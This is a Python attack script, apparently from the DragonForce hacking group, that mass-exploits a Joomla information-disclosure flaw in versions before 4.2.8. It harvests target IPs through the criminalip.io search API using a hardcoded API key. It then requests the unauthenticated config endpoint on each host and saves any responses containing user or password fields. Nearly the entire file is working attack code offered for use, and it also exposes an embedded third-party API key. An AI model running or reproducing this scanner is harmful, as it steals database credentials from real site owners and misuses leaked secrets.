# Dorker Author: ManGTX
# Joomla Author: Pari Malam
import requests
import sys
import argparse
import os
import re
import urllib.request
import colorama
from colorama import Fore, Style, Back, init
import cloudscraper

init(autoreset=True)
cloudscraper.DEFAULT_SCRAPER = None
requests.urllib3.disable_warnings()

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    print(f"""{Style.BRIGHT + Fore.RED}
    ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗
    ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║
    ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║
    ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ 
                                                                                                                
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.BRIGHT + Fore.YELLOW}  
                                                    Coded By Pari Malam & ManGTX
                                              [+] Joomla! < 4.2.8 - Dorker With Exploitation [+]
                                                   
                                               Forum: https://dragonforce.io
                                          Github: https://github.com/Pari-Malam
                                       Telegram: https://telegram.me/DragonForceIO
                                        
                                        
                                    Get Started With (pip install -r requirements.txt)
                                                 Usage: python joomla-428.py
    {Fore.WHITE}═══════════════════════════════════════════════════════════════════════════════════════════════════════════════""")
banners()


dork = input("Please write your Dork: ")
payload = {}
headers = {
    "x-api-key": "QFya7ZB7egjVMmNv3ellCb36AR3rIEbqSKZpUdvJqpjhWIB0Xx1ABgSNckER"
}

if dork:
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'darwin',
            'mobile': False
        }
    )

    endpoint = "https://api.criminalip.io/v1/banner/search?query=" + dork + "&offset=0"
    response = scraper.get(endpoint, headers=headers, data=payload)
    ip_pattern = r'\b(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b'
    regex = '|'.join([ip_pattern])
    ip_addresses = re.findall(regex, response.text)

    with open("Results/joomla_ips.txt", "w") as f:
        for ip_address in ip_addresses:
            f.write(ip_address + "\n")
        print(f"{Fore.GREEN}IP addresses written to Results/joomla_ips.txt{Style.RESET_ALL}\nFootprints Notes: Please be patient until the process is done!")
else:
    print(f"{Fore.RED}Please provide a Dork{Style.RESET_ALL}")

def scan_single_url(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    path = "/api/index.php/v1/config/application?public=true" # go find some idea to massive scan endpoints.txt files.
    full_url = url + path
    response = requests.get(full_url, headers=headers, verify=False)
    sensitive_matches = []
    if response.status_code == 200 or response.status_code == 406:
        lines = response.text.split("\n")
        for line in lines:
            matches = re.findall(r'.{0,20}(user|pass|id).{0,20}', line)
            for match in matches:
                sensitive_matches.append(match)
    return response.text, sensitive_matches

def scan_multiple_urls(url_list):
    with open(url_list, "r") as f:
        for url in f:
            url = url.strip()
            if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", url):
                url_file_name = f"ip_{url}.txt"
            else:
                url_file_name = re.sub(r"https?://", "", url).rstrip("/") + ".txt"
            url_file_path = f"Results/{url_file_name}"
            response, sensitive_matches = scan_single_url(url)
            if sensitive_matches:
                with open(url_file_path, "w") as f:
                    f.write(response)
                print(f"Sensitive info found in {url} and saved to {url_file_path}")
            else:
                print(f"No sensitive info found in {url}")



scan_multiple_urls("Results/joomla_ips.txt")
